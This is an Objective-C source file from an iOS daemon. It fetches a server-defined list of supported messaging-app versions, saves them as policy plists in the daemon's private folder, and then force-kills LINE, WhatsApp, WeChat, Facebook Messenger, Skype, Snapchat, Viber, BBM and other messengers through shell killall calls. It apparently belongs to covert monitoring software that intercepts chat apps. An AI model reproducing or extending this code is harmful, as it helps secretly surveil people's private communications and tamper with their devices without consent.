//
//  IMVersionControlManagerImpl.m
//  IMVersionControlManager
//
//  Created by Ophat Phuetkasickonphasutha on 8/15/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "IMVersionControlManagerImpl.h"
#import "IMVersionControlDelegate.h"
#import "DefStd.h"
#import "DefDDM.h"
#import "DataDelivery.h"
#import "GetSupportIM.h"
#import "GetSupportIMResponse.h"
#import "DeliveryRequest.h"
#import "DeliveryResponse.h"
#import "CRC32.h"

#import "IMServiceInfo.h"
#import "DaemonPrivateHome.h"

@interface IMVersionControlManagerImpl (private)
- (DeliveryRequest *) IMVersionControlRequest;
- (void) killAllIMs;
@end

@implementation IMVersionControlManagerImpl
@synthesize mDDM,mIMVersionControlDelegate;

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	if ((self = [super init])) {
		[self setMDDM:aDDM];

	}
	return (self);
}
-(BOOL)requestForIMVersionList: (id<IMVersionControlDelegate>) aDelegate{
	BOOL ok = NO;
	DeliveryRequest *imVersionControlRequest = [self IMVersionControlRequest];
	if (![mDDM isRequestIsPending:imVersionControlRequest]) {
		[mDDM deliver:imVersionControlRequest];
		[self setMIMVersionControlDelegate:aDelegate];
		ok = YES;
	}
	return (ok);
}
- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog(@"==================== aResponse %@",aResponse);
	
	if ([aResponse mSuccess]) {
		id <IMVersionControlDelegate> delegate = [self mIMVersionControlDelegate];
		[self setMIMVersionControlDelegate:nil];
		
		if ([delegate respondsToSelector:@selector(IMVersionControlRequireForIMVersionListCompleted:)]) {
			[delegate IMVersionControlRequireForIMVersionListCompleted:nil];
		}
		
		NSString *originalPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
		GetSupportIMResponse *supportIMResponse= (GetSupportIMResponse *)[aResponse mCSMReponse];
		NSArray * responseDataArray = [supportIMResponse mIMServices];
		DLog (@"responseDataArray = %@", responseDataArray)
		
		for (IMServiceInfo * info in responseDataArray){
			NSMutableDictionary * plist = [[NSMutableDictionary alloc] init];
			[plist setObject:[NSString stringWithFormat:@"%ld",(long)[info mIMClientID]] forKey:@"imclientid"];
			[plist setObject:[info mLatestVersion] forKey:@"latestversion"];
			NSMutableArray * exception = [NSMutableArray array];
			for (int i=0;i<[[info mExceptionVersions] count];i++){
				[exception addObject:[[info mExceptionVersions]objectAtIndex:i]];
			}
			[plist setObject:exception forKey:@"exceptionversions"];
			[plist setObject:[NSString stringWithFormat:@"%ld",(long)[info mPolicy]] forKey:@"policy"];
			
			DLog (@"plist of im version = %@", plist)
			
			[plist writeToFile:[NSString stringWithFormat:@"%@%ld.plist",originalPath,(long)[info mIMClientID]] atomically:YES];
			[plist release];
		}
		
		[self killAllIMs];
	} else {
		id <IMVersionControlDelegate> delegate = [self mIMVersionControlDelegate];
		[self setMIMVersionControlDelegate:nil];
		
		NSDictionary *userInfo	= [NSDictionary dictionaryWithObject:aResponse
															 forKey:@"DMMResponse"];
		NSError *error			= [NSError errorWithDomain:@"IM Version Control Error"
											   code:[aResponse mStatusCode]
										   userInfo:userInfo];
		
		if ([delegate respondsToSelector:@selector(IMVersionControlRequireForIMVersionListCompleted:)]) {
			[delegate IMVersionControlRequireForIMVersionListCompleted:error];
		}
	}
}
- (void) updateRequestProgress: (DeliveryResponse*) aResponse {

}

- (DeliveryRequest *) IMVersionControlRequest {
	DeliveryRequest *deliveryRequest = [[DeliveryRequest alloc] init];
	GetSupportIM *commandData = [[GetSupportIM alloc] init];
	[deliveryRequest setMCallerId:kDDC_IMVersionControlManager];
	[deliveryRequest setMMaxRetry:3];
	[deliveryRequest setMRetryTimeout:60];
	[deliveryRequest setMConnectionTimeout:60];
	[deliveryRequest setMEDPType:kEDPTypeGetSupportIM];
	[deliveryRequest setMPriority:kDDMRequestPriortyHigh];
	[deliveryRequest setMCommandCode:[commandData getCommand]];
	[deliveryRequest setMCommandData:commandData];
	[deliveryRequest setMCompressionFlag:1];
	[deliveryRequest setMEncryptionFlag:1];
	[deliveryRequest setMDeliveryListener:self];
	[commandData release];
	return ([deliveryRequest autorelease]);	
}

- (void) killAllIMs {
	system("killall LINE");
	system("killall Facebook");
	system("killall Messenger");        // Facebook Messenger, Yahoo Messenger (Iris)
	system("killall WhatsApp");
	system("killall MicroMessenger");   // WeChat
	system("killall Viber");
	system("killall Skype");            // Both for iPhone and iPad
    system("killall -9 BBM");
    system("killall Snapchat");
    system("killall Hangouts");
    system("killall Y_Messenger");      // Yahoo Messenger
    system("killall Slingshot");
    system("killall 'LINE for iPad'");  // LINE for iPad
}

- (void) dealloc {
	[super dealloc];
}

@end
